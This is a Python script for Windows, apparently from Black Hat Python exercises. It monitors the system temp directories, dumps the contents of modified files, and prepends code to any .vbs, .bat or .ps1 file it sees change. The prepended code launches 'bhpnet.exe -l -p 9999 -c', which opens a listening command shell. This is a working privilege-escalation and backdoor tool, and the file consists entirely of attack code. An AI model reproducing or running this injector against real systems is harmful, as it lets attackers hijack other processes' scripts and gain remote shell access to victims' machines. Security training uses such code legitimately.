# -*- coding: utf-8 -*-
import tempfile
import threading
import win32file
import win32con
import os

dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

file_types = {}
command = r"C:\WINDOWS\TEMP\bhpnet.exe -l -p 9999 -c"
file_types[".vbs"] = ["\r\n'bhpmaker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"{}\")\r\n".format(command)]
file_types[".bat"] = ["\r\n'REM bhpmaker\r\n", "\r\n{}\r\r".format(command)]
file_types[".ps1"] = ["\r\n#bhpmaker","Start-Process \"{}\"\r\n".format(command)]

def inject_code(full_filename, extension, contents):
    if file_types[extension][0] in contents.decode("utf-8"):
        return

    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents.decode("utf-8")

    with open(full_filename, "wb") as f:
        f.write(full_contents.encode("utf-8"))
    print(r"[\o/] Injected code")

def start_monitor(path_to_watch):
    FILE_LIST_DIRECTORY = 0x0001

    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
        )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME | 
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE | 
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
                )
            for action, file_name in results:
                full_name = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f"[+] Creates {full_name}")
                elif action == FILE_DELETED:
                    print(f"[-] Deleted {full_name}")
                elif action == FILE_MODIFIED:
                    print(f"[*] Modified {full_name}")

                    print("[vvv] Dumping contents...")
                    try:
                        with open(full_name, "rb") as f:
                            contents = f.read()
                        print(contents)
                        print("[^^^] Dump complete")
                    except Exception as e:
                        print(f"[!!!] Failed error:{e}")

                    filename,extension = os.path.splitext(full_name)
                    if extension in file_types:
                        inject_code(full_name, extension, contents)

                elif action == FILE_RENAMED_FROM:
                    print(f"[>] Renamed from: {full_name}")
                elif action == FILE_RENAMED_TO:
                    print(f"[<] Renamed to: {full_name}")
                else:
                    print(f"[???] Unknown: {full_name}")
        except Exception as e:
            print(f"[!!!] Error: {e}")

for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor, args=(path,))
    print(f"Spawning monitoring thread for path: {path}")
    monitor_thread.start()
